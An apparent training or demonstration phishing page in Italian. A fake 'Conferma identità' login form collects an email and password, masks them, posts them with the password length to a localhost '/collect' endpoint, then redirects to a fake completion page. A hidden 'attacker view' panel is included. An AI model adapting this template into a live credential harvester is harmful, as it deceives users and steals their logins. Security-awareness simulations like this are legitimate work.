<!DOCTYPE html>
<html lang="it">
<head>
  <meta charset="UTF-8">
  <title>Verifica sicurezza account</title>
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <style>
    body {
      background:#f1f3f6;
      font-family:Arial,sans-serif;
    }
    .box {
      width:360px;
      margin:120px auto;
      background:#fff;
      padding:30px;
      border-radius:6px;
      box-shadow:0 6px 18px rgba(0,0,0,.15);
    }
    input, button {
      width:100%;
      padding:10px;
      margin-top:12px;
    }
    button {
      background:#0b5ed7;
      color:#fff;
      border:none;
    }
    .hidden { display:none; }

    /* Vista attaccante */
    .attacker {
      width:600px;
      margin:80px auto;
      background:#111;
      color:#0f0;
      padding:20px;
      font-family:monospace;
      border-radius:6px;
    }
  </style>
</head>
<body>

<!-- VISTA UTENTE -->
<div class="box" id="loginBox">
  <h2>Conferma identità</h2>
  <p>Per motivi di sicurezza è richiesta la verifica dell’account.</p>

  <form onsubmit="return fakeLogin();">
    <input type="email" id="email" placeholder="Email" required>
    <input type="password" id="password" placeholder="Password" required>
    <button type="submit">Continua</button>
  </form>
</div>

<!-- VISTA ATTACCANTE (nascosta) -->
<div class="attacker hidden" id="attackerView">
  <h3>[ Attacker View – Simulazione ]</h3>
  <pre id="dump"></pre>
</div>

<script>
function maskEmail(email) {
  const [u, d] = email.split("@");
  return u[0] + "****@" + d;
}

function maskPassword(password) {
  return "*".repeat(password.length);
}

function fakeLogin() {
  const email = document.getElementById("email").value;
  const password = document.getElementById("password").value;

  const payload = {
    email: maskEmail(email),
    password: maskPassword(password),
    passwordLength: password.length,
    timestamp: new Date().toISOString()
  };

  /* ===== POST REALE ===== */
  fetch("http://localhost:3000/collect", {
    method: "POST",
    headers: {
      "Content-Type": "application/json"
    },
    body: JSON.stringify(payload)
  }).catch(() => {
    // eventuale errore ignorato (comportamento realistico)
  });

  /* ===== REDIRECT COME PRIMA ===== */
  setTimeout(() => {
    window.location.href = "verifica-completata.html";
  }, 700);

  return false;
}
</script>

</body>
</html>
